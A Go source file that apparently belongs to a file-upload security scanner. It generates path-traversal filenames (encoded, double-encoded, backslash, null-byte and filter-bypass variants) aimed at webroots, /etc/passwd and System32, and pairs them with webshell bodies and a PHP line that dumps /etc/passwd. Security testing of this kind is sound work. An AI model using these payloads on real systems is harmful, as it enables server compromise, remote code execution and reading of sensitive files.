package payload

// moduleD generates Path Traversal test payloads.
func moduleD() []*Payload {
	var tests []*Payload

	// D1: Standard traversal sequences in filename
	traversalTests := []struct {
		filename  string
		technique string
		tags      []string
	}{
		{"../../../test.php", "Basic path traversal (../x3) + .php",
			[]string{"path-traversal", "dot-dot-slash", "executable"}},
		{"../../test.php", "Shallow path traversal (../x2) + .php",
			[]string{"path-traversal", "dot-dot-slash", "executable"}},
		{"../../../../test.php", "Deep path traversal (../x4) + .php",
			[]string{"path-traversal", "dot-dot-slash", "executable"}},
		{"../../../../../test.php", "Very deep path traversal (../x5)",
			[]string{"path-traversal", "dot-dot-slash", "executable"}},
		{"../../../../../../../../test.php", "Aggressive traversal (../x8)",
			[]string{"path-traversal", "dot-dot-slash", "executable"}},

		// D2: URL-encoded traversal
		{"%2e%2e%2f%2e%2e%2f%2e%2e%2ftest.php", "URL-encoded traversal (.%2e/%2f encoding)",
			[]string{"path-traversal", "url-encoded", "executable"}},
		{"..%2f..%2f..%2ftest.php", "Partially URL-encoded traversal",
			[]string{"path-traversal", "url-encoded", "executable"}},
		{"%2e%2e/test.php", "URL-encoded dots only",
			[]string{"path-traversal", "url-encoded", "executable"}},
		{"..%5ctest.php", "Backslash URL-encoded traversal",
			[]string{"path-traversal", "url-encoded", "backslash", "executable"}},

		// D3: Double URL-encoded traversal
		{"%252e%252e%252f%252e%252e%252ftest.php", "Double URL-encoded traversal",
			[]string{"path-traversal", "double-url-encoded", "executable"}},
		{"%252e%252e%255ctest.php", "Double URL-encoded backslash traversal",
			[]string{"path-traversal", "double-url-encoded", "backslash", "executable"}},

		// D4: Backslash traversal (Windows)
		{"..\\..\\..\\test.asp", "Backslash traversal (Windows) - ..\\x3",
			[]string{"path-traversal", "backslash", "windows", "executable"}},
		{"..\\..\\test.aspx", "Backslash traversal (Windows) - ..\\x2",
			[]string{"path-traversal", "backslash", "windows", "executable"}},

		// D5: Mixed slash traversal
		{"../..\\../test.php", "Mixed forward/backslash traversal",
			[]string{"path-traversal", "mixed-slash", "executable"}},
		{"..\\/..\\/test.jsp", "Escaped backslash traversal",
			[]string{"path-traversal", "mixed-slash", "executable"}},

		// D6: Traversal with specific targets
		{"../../../etc/passwd", "Traversal to /etc/passwd (Unix)",
			[]string{"path-traversal", "sensitive-file", "unix"}},
		{"../../../var/www/html/shell.php", "Traversal to webroot + .php",
			[]string{"path-traversal", "webroot", "executable"}},
		{"../../../windows/system32/test.asp", "Traversal to System32 (Windows)",
			[]string{"path-traversal", "sensitive-file", "windows", "executable"}},

		// D7: Traversal with null byte termination
		{"../../../test.php%00.jpg", "Traversal with null byte + allowed extension",
			[]string{"path-traversal", "null-byte", "executable"}},
		{"../../../test.asp%00.jpg", "Traversal + .asp with null byte + .jpg",
			[]string{"path-traversal", "null-byte", "executable"}},

		// D8: Filter evasion via encoding and wrapping
		{"....//....//test.php", "Double dot-slash filter bypass (..../)",
			[]string{"path-traversal", "filter-bypass", "executable"}},
		{"..././..././test.php", "Alternate traversal encoding",
			[]string{"path-traversal", "filter-bypass", "executable"}},
		{"..;/..;/test.jsp", "Semicolon-separated traversal",
			[]string{"path-traversal", "filter-bypass", "semicolon", "executable"}},
		{"../\\../\\test.php", "Mixed slash traversal variant",
			[]string{"path-traversal", "filter-bypass", "executable"}},

		// D9: Absolute path injection
		{"/tmp/test.php", "Absolute path injection (/tmp/)",
			[]string{"absolute-path", "unix", "executable"}},
		{"/var/www/test.php", "Absolute path to webroot",
			[]string{"absolute-path", "webroot", "unix", "executable"}},
		{"C:\\Windows\\test.asp", "Absolute Windows path injection",
			[]string{"absolute-path", "windows", "executable"}},
		{"/dev/shm/test.php", "Absolute path to /dev/shm",
			[]string{"absolute-path", "unix", "executable"}},
	}

	for _, t := range traversalTests {
		ext := extractExtension(t.filename)
		var payload []byte

		// Special case: sensitive files like /etc/passwd should use PHP wrappers
		if t.filename == "../../../etc/passwd" {
			// Use PHP code that reads the file if executed
			payload = []byte(`<?php echo file_get_contents('/etc/passwd'); ?>`)
		} else {
			// Use appropriate webshell for the extension
			payload = getPayloadForExtension(ext)
		}

		tests = append(tests, &Payload{
			TestType:  TestTypePathTraversal,
			Technique: t.technique,
			Filename:  t.filename,
			Extension: ext,
			Body:      payload, // ✅ ACTUAL EXECUTABLE CODE
			Tags:      t.tags,
		})
	}

	return tests
}
